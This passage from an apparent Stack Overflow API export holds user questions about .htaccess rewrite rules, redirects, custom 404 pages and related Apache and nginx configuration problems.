rel=\"nofollow\">http://www.etc</a></p>\n\n<p>The php is a simple href call <code>&lt;a href=\"?id=blog\"&gt;&lt;/a&gt;</code> that appears in the address bar as <code>wip_04/?id=blog</code> or <code>wip_04/index.php?id=blog</code> (depending upon whether you go to index.php to begin with) - wip_04 is my offline site root.</p>\n\n<p>I want to rewrite to <code>wip_04/blog</code> or even <code>wip_04/blog/index.php</code>.</p>\n\n<p>The full example would be from <code>http://website.co.uk/?id=blog</code> to <code>http://website.co.uk/blog/</code> - there's another index.php inside blog/</p>\n\n<p>I'm not looking for a general rewrite rule but one for this specific instance and I'm stumped.</p>\n\n<p>Any help greatly appreciated.</p>\n\n<p>//Simon</p>\n"},{"tags":[".htaccess","magento","nginx","webserver"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":201,"score":0,"question_id":12213255,"title":"Nginx - Magento multiple websites","body":"<p>I have a Magento installation with multiple websites, which is running in Apache web server.\nNow I want to move these to Nginx web server; how can I achieve this with Nginx configuration?\nBelow is the htaccess code which is redirecting websites:</p>\n\n<pre><code>SetEnvIf HOST 44\\.55\\.222\\.101\\:8080 MAGE_RUN_CODE=website_new\nSetEnvIf HOST 44\\.55\\.222\\.101\\:8080 MAGE_RUN_TYPE=website\n</code></pre>\n\n<p>Please help.</p>\n"},{"tags":[".htaccess","mod-rewrite","httpd.conf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12772961,"title":"RewriteEngine on casuses error 500","body":"<p>I am tring to write a rewrite engine. \nSo I have written this in the .htaccess file:</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-l\n\nRewriteRule     ^(.+)$ index.php?url=$1 [QSA, L]\n</code></pre>\n\n<p>I get a 500 error msg. </p>\n\n<p>I checked the httpd.conf file and this line</p>\n\n<pre><code>LoadModule setenvif_module modules/mod_setenvif.so\n</code></pre>\n\n<p>is not commented out..</p>\n\n<p>I also tried to comment out all these line from the .htaccess file like so,</p>\n\n<pre><code>#RewriteEngine on\n\n#RewriteCond %{REQUEST_FILENAME} !-d\n#RewriteCond %{REQUEST_FILENAME} !-f\n#RewriteCond %{REQUEST_FILENAME} !-l\n\n#RewriteRule     ^(.+)$ index.php?url=$1 [QSA, L]\n</code></pre>\n\n<p>but I still get a 500 error.\nWhat else can I look at?</p>\n"}]}
{"total":14528,"page":11,"pagesize":100,"questions":[{"tags":[".htaccess","mod-rewrite","httpd.conf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12772961,"title":"RewriteEngine on casuses error 500","body":"<p>I am tring to write a rewrite engine. \nSo I have written this in the .htaccess file:</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-l\n\nRewriteRule     ^(.+)$ index.php?url=$1 [QSA, L]\n</code></pre>\n\n<p>I get a 500 error msg. </p>\n\n<p>I checked the httpd.conf file and this line</p>\n\n<pre><code>LoadModule setenvif_module modules/mod_setenvif.so\n</code></pre>\n\n<p>is not commented out..</p>\n\n<p>I also tried to comment out all these line from the .htaccess file like so,</p>\n\n<pre><code>#RewriteEngine on\n\n#RewriteCond %{REQUEST_FILENAME} !-d\n#RewriteCond %{REQUEST_FILENAME} !-f\n#RewriteCond %{REQUEST_FILENAME} !-l\n\n#RewriteRule     ^(.+)$ index.php?url=$1 [QSA, L]\n</code></pre>\n\n<p>but I still get a 500 error.\nWhat else can I look at?</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":36,"score":0,"question_id":12772717,"title":"How to make correct mod_rewrite rules in.htaccess","body":"<p>I am trying to make rewrite rule which rewrite this long url to a SEO friendly one.\nHowever, my rule didn't work and the destination url become a 404 page. \nI would appreciate any helps. Thank you! </p>\n\n<p><strong>This is an example of original URL</strong></p>\n\n<p><a href=\"http://www.mydomain.com/index.php?module=product&amp;pId=102&amp;id=14495&amp;category=computer/DELL&amp;start=0/\" rel=\"nofollow\">http://www.mydomain.com/index.php?module=product&amp;pId=102&amp;id=14495&amp;category=computer/DELL&amp;start=0/</a></p>\n\n<p><strong>This is my rewrite rule</strong></p>\n\n<p>RewriteRule ^module/([^/]<em>)/pId/([^/]</em>)/id/([^/]<em>)/category/([^/]</em>)/start/([^/]*)$ /index.php?module=$1&amp;pId=$2&amp;id=$3&amp;category=$4&amp;start=$5 [L]</p>\n\n<p><strong>This is transformed URL</strong></p>\n\n<p><a href=\"http://www.mydomain.com/index/module/product/pId/102/id/14495/category/computer/DELL/start/0/\" rel=\"nofollow\">http://www.mydomain.com/index/module/product/pId/102/id/14495/category/computer/DELL/start/0/</a></p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12764891,"title":"How To Force Redirect To A Certain Directory via .htaccess","body":"<p>I am on a server running WordPress. WP is installed in the Document Root and the .htaccess file below is controlling every request.</p>\n\n<p>What I need to do is have a certain directory off the Document Root, let's call it \"bypass\", resolve on its own and not run through WordPress.</p>\n\n<p>Is that possible? What might the .htaccess directive(s) look like to make that happen?</p>\n\n<p>Thanks for helping me solve this need.</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^ems /ems/index.php [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12771538,"title":".htaccess on WordPress","body":"<p>I'm not sure about the location that my .htaccess should be. I'm working on a WordPress theme. Is it ok to leave it inside the theme's folder? Or should I overwrite the original WordPress .htaccess on the root folder?\nThanks in advance!</p>\n"},{"tags":["php","regex",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":30,"score":0,"question_id":12769339,"title":".htaccess redirecting without port","body":"<p>I am trying to redirect from site.com/foo/bar.php to site.com/foo/bar</p>\n\n<p>I came up with this code:</p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s([^.]+)\\.php [NC]\nRewriteRule ^(?!clients/).*$ %1 [R=301,L,NC]\n</code></pre>\n\n<p>and to send request to .php file:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME}.php -f [NC]\nRewriteRule ^(?!clients/).*$ %{REQUEST_URI}.php [L,NC]\n</code></pre>\n\n<p>but above redirects to site.com:8080/foo/bar</p>\n\n<p>The port is getting added, I've tried <code>RewriteCond %{SERVER_PORT} 8080</code> and many other things but it didnt work. Thanks guys.</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12767513,"title":".htaccess rewrite conditition ignore subdomain","body":"<p>My main domain is a Wordpress blog, and the .htaccess rewrite for it is as follows...</p>\n\n<pre><code> &lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n    RewriteRule ^index\\.php$ - [L]\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule . /index.php [L]\n  &lt;/IfModule&gt;\n</code></pre>\n\n<p>This works great, but I have a subdomain in that same directory, and am using this rewrite for it....</p>\n\n<pre><code>    RewriteCond %{SERVER_PORT} ^443$\n    RewriteCond %{HTTP_HOST} ^my\\.domain\\.com$ [NC]\n    RewriteCond %{REQUEST_URI} !^/my/\n    RewriteRule ^(.*) /my/$1\n</code></pre>\n\n<p>That's for my wildcard SSL certificate.  This works great, but if the location doesn't exist in the subdomain I get wordpress's error page.  I need the wordpress rewrite to ignore the \"my\" subdomain.  How can I do that?</p>\n\n<p>I was thinking something like....</p>\n\n<pre><code>  &lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n    RewriteRule ^index\\.php$ - [L]\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_URI} !^my\\.domain\\.com$ \n    RewriteRule . /index.php [L]\n  &lt;/IfModule&gt;\n</code></pre>\n\n<p>But that doesn't work, also tried this....</p>\n\n<pre><code>  &lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n    RewriteRule ^my\\.domain\\.com - [L,NC]\n    RewriteRule ^index\\.php$ - [L]\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule . /index.php [L]\n  &lt;/IfModule&gt;\n</code></pre>\n\n<p>Any ideas?</p>\n"},{"tags":["php","wordpress",".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12767570,"title":"Can I make my wp-login.php to be run as index in Wordpress?","body":"<p>I want to know if I can make my wp-login.php to run as like index.php in WordPress? And if the user is already logged in it will go to index.php?</p>\n"},{"tags":[".htaccess","url-parameters"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":16,"score":1,"question_id":12767325,"title":"htaccess parmeter","body":"<p>I have the following rewrite. The last one is par ID, but i want it variable, has to be ID or Quantity, is that possible? </p>\n\n<p>now:</p>\n\n<p>RewriteRule ^([a-z0-9-]+)/([a-z0-9-]+)/([a-z0-9-]+)/?$ index.php?action=$1&amp;item=$2&amp;id=$3 [NC,L]</p>\n\n<p>must be:</p>\n\n<p>RewriteRule ^([a-z0-9-]+)/([a-z0-9-]+)/([a-z0-9-]+)/?$ index.php?action=$1&amp;item=$2&amp;id=$3 [NC,L]</p>\n\n<p>RewriteRule ^([a-z0-9-]+)/([a-z0-9-]+)/([a-z0-9-]+)/?$ index.php?action=$1&amp;item=$2&amp;quantity=$3 [NC,L]</p>\n"},{"tags":[".htaccess","firefox","cross-domain","base64","font-face"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":118,"score":0,"question_id":12763827,"title":"@font-face in firefox still cross domain restricted after base64 embedded, htaccess edited, fonts subsetted, and absolute urls used ","body":"<p>I've built a website at <a href=\"http://theorthodoc.com\" rel=\"nofollow\">http://theorthodoc.com</a> and included some Foundation Icon Fonts button at the top that work in all but firefox.  I figured its that @font-face cross domain restriction so I edit my .htaccess file and restart apache:</p>\n\n<pre><code>&lt;FilesMatch \"\\.(ttf|ttc|otf|eot|woff|font.css)$\"&gt;\n  &lt;IfModule mod_headers.c&gt;\n    Header set Access-Control-Allow-Origin \"*\"\n  &lt;/IfModule&gt;\n&lt;/FilesMatch&gt;\n\nAddType application/vnd.ms-fontobject .eot\nAddType font/ttf .ttf\nAddType font/otf .otf\nAddType application/x-font-woff woff\n</code></pre>\n\n<p>No dice.  Then I use absolute URLs in the declarations AND I used the font-squirrel base64 woff embedding option:</p>\n\n<pre><code>@font-face {\n    font-family: \"foundation_icons_general_enRg\";\n    src: url(\"6 mile long embed code here\") format(\"woff\"),\n         url(\"http://inortho.net/busciglio/wp-content/themes/FoundationWIP/fonts/foundation-icons-general-enclosed-webfont.ttf\") format(\"truetype\"),\n     url(\"http://inortho.net/busciglio/wp-content/themes/FoundationWIP/fonts/foundation-icons-general-enclosed-webfont.svg#foundation_icons_general_enRg\") format(\"svg\");\n    font-weight: normal;\n    font-style: normal;\n}\n</code></pre>\n\n<hr>\n\n<p>I figured this last thing would work since the code is right there in the css????  I even heard somewhere that it could be the single-quotes that's causing the problem so I even changed those even though thats probably a problem that was fixed somewhere between FF3.5 and FF15.  I've cleared out all caches and histories, and restarted the webserver, subset the fonts, and used absolute urls.  In Firefox those two little icons are just greyed out in the source.  </p>\n\n<p>At this point, I'm just giving up and using images and seeing if someone else can think of something I haven't seen. Please help.</p>\n\n<p>Oh and of course, IE doesn't work with it either.</p>\n\n<hr>\n"},{"tags":[".htaccess","url","canonical","canonical-link"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12763432,"title":"Canonical URL not redirecting","body":"<p>I want to get rid of the <code>www.</code> before my website name, so I tried setting a canonical URL tag in the files, but it didn't redirect me to <a href=\"http://blablabla.tk\" rel=\"nofollow\">http://blablabla.tk</a> when I typed www.blablabla.tk</p>\n\n<p>I tried this code: <code>&lt;link rel=\"canonical\" href=\"http://blablabla.tk\" /&gt;</code></p>\n\n<p>Do I have to change something in the <strong>.htaccess</strong> file or something?</p>\n"},{"tags":[".htaccess","wamp"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":12764105,"title":"WAMP - Trailing Slash (/) Gives Error 500 \"Internal Server Error\" - .htaccess Error?","body":"<p>I use WAMP on my computer and when coding my website I decided to remove the .html extension in hopes of improving aesthetics.</p>\n\n<p>This works fine, so, in my case, temp.jakegriffin.co.uk/index.html became /index which is what I wanted. Unfortunately, if there is a trailing / after index, I get:</p>\n\n<pre><code>Internal Server Error\n\nThe server encountered an internal error or misconfiguration and was unable to complete     your request.\n\nPlease contact the server administrator, admin@localhost and inform them of the time the error occurred, and anything you might have done that may have caused the error.\n\nMore information about this error may be available in the server error log.\n</code></pre>\n\n<p>When I attempt to fix this in the .htaccess file, I either get the error 403 were I'm forbidden or the error 404 were the page does not exist.</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.html -f\nRewriteRule ^(.*)$ $1.html\n</code></pre>\n\n<p>That is the code in my .htaccess file for the removal of the extension. If someone could help me, it would be greatly appreciated.</p>\n\n<p>Thanks in advance,\nJake.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12755597,"title":"Settings up URL rewrite on sub domain","body":"<p><strong>The problem:</strong></p>\n\n<p>I've got a series of Domains linked to my server, currently my wedding site runs from a folder called /wedding. In my cPanel i've set the default destination to this folder, and within it are all my files, index.html, location.html and so on..</p>\n\n<p>Now my problem so far is that nothing i've tried seems to be letting me remove the .html from the ends of URLs. </p>\n\n<p><strong>Currently im trying:</strong></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nOptions +FollowSymLinks  \nRewriteEngine On  \n\nRewriteCond %{SCRIPT_FILENAME} !-d  \nRewriteCond %{SCRIPT_FILENAME} !-f  \n\nRewriteRule ^gallery$ ./wedding/gallery.html  \n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I'll be honest, i've got no idea what im doing. Some help would be really appreciated. I just want clean URLs</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12196400,"title":"How to use mod_rewrite in htaccess","body":"<p>Before I am going mad, I need some help with <code>mod_rewrite</code> in htaccess.</p>\n\n<p>I want to rewrite the following url as follows:</p>\n\n<ul>\n<li><p><code>www.domain.com/reviews</code> or <code>www.domain.com/reviews/</code> -> stay as is</p></li>\n<li><p><code>www.domain.com/reviews/(one char or number)</code> or <code>www.domain.com/reviews/(one char or number)/</code> -> stay as is</p></li>\n<li><p><code>www.domain.com/reviews/(string)</code> or <code>www.domain.com/reviews/(sting)/</code>\n-> 301 redirect to <code>www.domain.com/(sting)/</code></p></li>\n</ul>\n\n<p>How to proceed ?</p>\n"},{"tags":["php","wordpress",".htaccess","dns","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":62,"score":-1,"question_id":12763796,"title":"Multiple domains different static pages","body":"<p>I have my main domain <code>domain.co.nz</code> with a static homepage of <code>home</code> but I also have a url that is great for SEO purposes and what I am trying to do is work out how I can have my <code>seoDomain.co.nz</code> point to a specific static page with the related information but the rest of the site remains <code>domain.co.nz</code></p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3613,"score":1,"question_id":1872505,"title":"Codeigniter $config['uri_protocol']\tproblem","body":"<p>I need to change  <code>$config['uri_protocol']</code> from AUTO to PATH_INFO (to allow url parameters)</p>\n\n<p>My problem: when I set <code>$config['uri_protocol']=\"PATH_INFO\";</code> the regular urls stop functioning and I get the homepage no matter which site page URL I click.</p>\n\n<p>print_r ($_SERVER) shows that url parameters I add appear only in REQUEST_URI an not in any other $_SERVER part.</p>\n\n<p>my htaccess is the <a href=\"http://codeigniter.com/wiki/mod%5Frewrite/\" rel=\"nofollow\">standard one</a> </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n\n    # This is different between local host and production server!!!\n    RewriteBase /\n\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>UPDATE:  </p>\n\n<p>I changed</p>\n\n<pre><code>RewriteRule ^(.*)$ index.php?/$1 [L]\n</code></pre>\n\n<p>to\n<code>RewriteRule ^(.*)$ index.php?/$1 [QSA,L]</code>  to allow url params to pass. Now url params appear also in  </p>\n\n<pre><code> $_SERVER\n\n REDIRECT_QUERY_STRING, QUERY_STRING AND REQUEST_URI\n</code></pre>\n\n<p>.</p>\n\n<p>The problem: I tried $config[‘uri_protocol’] with all the above options but still CI gives error 404 whenever I add URL parameters.</p>\n\n<p>Note: I tried the above on 2 servers. One of them is centos5/Apache2/Plesk VPS and another one is on xampp/Vista. </p>\n"},{"tags":["php",".htaccess","url","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":26,"score":-1,"question_id":12763151,"title":"Permalink / URL on left frame staying same","body":"<p>I have a frame on the left of my site, where are user generated topics. If I click on them, I can see them, no problem, but what I can't see, is the full <code>URL</code> of the topic I clicked. I only see the full URL if I hover it (you can see it beneath in Firefox), but not in the browser bar itself...</p>\n\n<p>How can I make it possible to get the full URL if clicked?</p>\n"},{"tags":[".htaccess","http-status-code-404","wamp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":12762555,"title":"htaccess 404 redirect not working","body":"<p>I'm attemping to replace the standard 404 error page to a custom one. I'm hosting on WAMP and have activated the rewrite module. I have created a .htaccess file, if I put in </p>\n\n<p>DirectoryIndex redirect.php</p>\n\n<p>it will use redirect.php instead of index.php, however if I replace that with</p>\n\n<p>ErrorDocument 404 /redirect.php</p>\n\n<p>and then go to a page that doesn't exist is still uses the standard 404 error page. Does anyone know if I'm using the command wrong and thats the problem or may it be that my WAMP isn't properly configured?</p>\n\n<p>Thanks for any suggestions.</p>\n"},{"tags":["php",".htaccess","mod-rewrite","right-click"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12762251,"title":"Removed .php extension of url, but not working on right click","body":"<p>I have edited my <strong>.htaccess</strong> file succesfully, by writing this code:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php\n</code></pre>\n\n<p>This enables me to get rid of the <code>.php</code> extension on my url. The problem now is that if I right click on a element of my website, I still see the .php url. If I remove it manually, the site is still visible, so the code works very well I guess, but how can I solve the \"right-click issue\" too?</p>\n\n<p><strong>PS: a second question... Does this effect the SEO of my website in any way?</strong></p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12761993,"title":".htaccess rewrite url for new subdomain","body":"<p>I have been rewritting the url's on my server <code>www.domain.com</code> using:</p>\n\n<pre><code>RewriteRule ^image/thumb-([0-9]*)-([0-9]*).jpg to.php?p=$1&amp;h=$3 [L,NC]\n</code></pre>\n\n<p>A url like: <code>http://www.domain.com/image/thumb-50-50.jpg</code></p>\n\n<p>I now have moved the files to the subdomain <code>dev.domain.com</code> and the rules are no longer working. please help</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","mobile","httpd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12328420,"title":"rewriterules for mobile site with htaccess","body":"<p>We got a website and we have almost figured out how to redirect it to m.domain.com in case its visited from a mobile browser. We are however stuck in two conditions and help would be appreciated for the two:</p>\n\n<p>a. It's not keeping the page name came from non index.html page. Like if visitor on mobile devices attempts www.domain.com/features.html it should forward to m.domain.com/features.html but instead it goes m.domain.com</p>\n\n<p>b. Some pages on main site are not on mobile site. So a problem exists, when user on mobile device goes to one of those specific pages like www.domain.com/user_guide.html it gets 404 when trying to access on Android. I think a rule needs to be made for each of these pages to exclude them from the code which forwards to mobile, and instead keep url normal.</p>\n"},{"tags":["apache",".htaccess"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1816,"score":0,"question_id":2994637,"title":"how to edit .htpasswd using php?","body":"<p>i have a protected directory where only user on .htpasswd can access, but sometimes it requires the user to change password or username, edit a specific username password to his username him self</p>\n\n<pre><code>sample users\nkevien : kka\nmike : mike\n</code></pre>\n\n<p>And let say i want to change kevien to XYZ</p>\n\n<p>And same thing goes to password</p>\n"},{"tags":["php","apache",".htaccess","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12760351,"title":"Getting 404 Not Found error while trying to use ErrorDocument","body":"<p>I know this thread has been talked a lot on the web and here, and I tried almost all the methods, but still I'm having the same problem.</p>\n\n<p>This is my url on my local server ( MAMP ) </p>\n\n<pre><code>http://localhost:8888/hellothere/index.php\n</code></pre>\n\n<p>And I've tried to insert a wrong path to take me to wrong page , like below :</p>\n\n<pre><code>http://localhost:8888/hellothere/eiurgiuerib\n</code></pre>\n\n<p>Instead of taking me to Error Page it shows :</p>\n\n<pre><code>Not Found\n\nThe requested URL /hellothere/eiurgiuerib was not found on this server.\n\nAdditionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.\n</code></pre>\n\n<p>My 404 page is inside of the Error directory. And inside my .htaccess file I have included this :</p>\n\n<pre><code>ErrorDocument 404 /Error/404.php\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12618793,"title":"Apache AllowOverride none doesn't work for sub-directories once All has been applied first","body":"<p>I'm not sure what is wrong here, but I have the following conf:</p>\n\n<pre><code>    # Root\n    &lt;Directory /var/www/xxx/&gt;\n            AllowOverride All\n\n            Header always append Directory Home\n    &lt;/Directory&gt;\n\n\n    # images\n    &lt;Directory /var/www/xxx/images/&gt;\n            AllowOverride None\n\n            Order allow,deny\n            allow from all\n\n            Header always append Directory images\n    &lt;/Directory&gt;\n</code></pre>\n\n<p>Inside the root dir I have an .htaccess file, to include it everywhere in the directory.</p>\n\n<p>What I'm trying to do - is to exclude \"images\" dir from this configuration.\nI've added a special header for every directory so I can debug it, and according to the CURL command below - it follow the rules correctly.</p>\n\n<pre><code>&lt; HTTP/1.1 401 Authorization Required\n&lt; Directory: Home, images\n&lt; Last-Modified: Fri, 21 Sep 2012 09:47:28 GMT\n&lt; ETag: \"9e81e5-4069-20b94c00\"\n&lt; Accept-Ranges: bytes\n&lt; Content-Length: 16489\n&lt; Connection: close\n&lt; Content-Type: image/png\n</code></pre>\n\n<p>The problem is that I'm receiving 401 instead of 200OK, according to the headers ( Home, images ) - it first get the \"All\" and then should overwrite it with \"None\" - but it doesn't, I'm still receiving the 401, what can be the problem here ?</p>\n"},{"tags":["php",".htaccess","oauth-2.0"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":55,"score":0,"question_id":12759828,"title":"can not grab query string","body":"<p>I am developing simple application that import contacts from yahoo addressbook. (With help of <a href=\"https://github.com/yahoo/yos-social-php5\" rel=\"nofollow\">Yahoo! Social SDK - PHP5</a>)\nAfter user authentication it redirect to callback url That contain oauth.request_token,openid.sig etc in query string. Like </p>\n\n<pre><code>http://xyz.com/user/validated.php?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;open.....oauth.request_token=11111111&amp;openid.sig=2222222\n</code></pre>\n\n<p>But after redirection it display index.php of root directory. why?</p>\n\n<pre><code>I removed all .htaccess files from my project.\n</code></pre>\n\n<p>content of my validated.php</p>\n\n<pre><code>print_r($_GET);\nexit;\n</code></pre>\n\n<p>After that I tried many urls manually. Here it is</p>\n\n<p><a href=\"http://xyz.com/user/validated.php?openid.ns=http%3A%2F%2Fspecs.openid.net\" rel=\"nofollow\">http://xyz.com/user/validated.php?openid.ns=http%3A%2F%2Fspecs.openid.net</a> --> not work\n<a href=\"http://xyz.com/user/validated.php?openid.ns=abc%3A%2F%2Fspecs.openid.net\" rel=\"nofollow\">http://xyz.com/user/validated.php?openid.ns=abc%3A%2F%2Fspecs.openid.net</a> --> works<br>\n<a href=\"http://xyz.com/user/validated.php?openid.ns=http%3A%2F%2F\" rel=\"nofollow\">http://xyz.com/user/validated.php?openid.ns=http%3A%2F%2F</a> --> works<br>\n<a href=\"http://xyz.com/user/validated.php?openid.ns=http%3A%2F%2Fabc\" rel=\"nofollow\">http://xyz.com/user/validated.php?openid.ns=http%3A%2F%2Fabc</a> --> works<br>\n<a href=\"http://xyz.com/user/validated.php?openid.ns=http%3A%2F%2Fabc.com\" rel=\"nofollow\">http://xyz.com/user/validated.php?openid.ns=http%3A%2F%2Fabc.com</a> --> not work</p>\n\n<p>How can I get that query string in my validated.php file ?\nThanks in advence</p>\n"},{"tags":[".htaccess","redirect","replace","space"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12759114,"title":"htaccess to replace space in url and redirect","body":"<p>I am newbie and want to solve a problem.\nI read same question but misunderstand:</p>\n\n<blockquote>\n  <p><a href=\"http://stackoverflow.com/questions/11444026/htaccess-redirect-url-with-space-in-it\">htaccess redirect url with space in it</a></p>\n</blockquote>\n\n<p>Please help me.\nMy site use wordpress with custom fields and tags.</p>\n\n<p>Custom Fields make lot of link such as:</p>\n\n<pre><code>http://domain.com/tag/Miss Earth\nhttp://domain.com/tag/Miss World\nhttp://domain.com/tag/Miss England\n...\n</code></pre>\n\n<p>(Space not %20)\nOf cource I also create tags: Miss Earth, Miss World, Miss England... but above links are not exist (space (\" \") must be replaced by \"-\" and \"M\" by \"m\" and \"E\" by \"e\"...</p>\n\n<p>I need use htaccess to replace space (\" \") character to \"-\" and auto redirect to really tags:</p>\n\n<pre><code>http://domain.com/tag/miss-earth\nhttp://domain.com/tag/miss-world\nhttp://domain.com/tag/miss-england\n</code></pre>\n\n<p>Please help me clearly, I am stupid with htaccess.</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","redirect","coldfusion","http-status-code-301"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12750333,"title":"CFM redirect 301","body":"<p>On Google I have a site that has a bunch of old links to its pages, they are links like this.</p>\n\n<pre><code> /mainpage.cfm?linkId=84&amp;LinkType=mainlink\n</code></pre>\n\n<p>I want to 301 redirect them with htaccess, but nothing I am trying works.</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{REQUEST_URI} ^/architectural\nRewriteRule .* /mainpage.cfm?linkId=84&amp;LinkType=mainlink\n</code></pre>\n\n<p>Any Ideas, I have tried many varients of this, it seems the problem is the .cfm file.</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12758408,"title":"htaccess: Remove \"folder\" permanently with 301","body":"<p>Although I have worked through other entries with the same theme I was not able to find a solution for my particular problem.</p>\n\n<p>Right now my URL-structure is like<br />\nwww.abc.com/in/something/bla<br /><br />\nI changed some settings and removed the /in/, now the URL-structure is<br /> www.abc.com/something/bla</p>\n\n<p>I want to redirect permanently to the new structure.</p>\n\n<p>None of the solutions I found @stackoverflow and in the web worked for me, therefore I paste (parts of) my htaccess-code beneath. It works perfectly except for the removal of /in/.<br />\nThanks in advance for helping me out!</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\n# 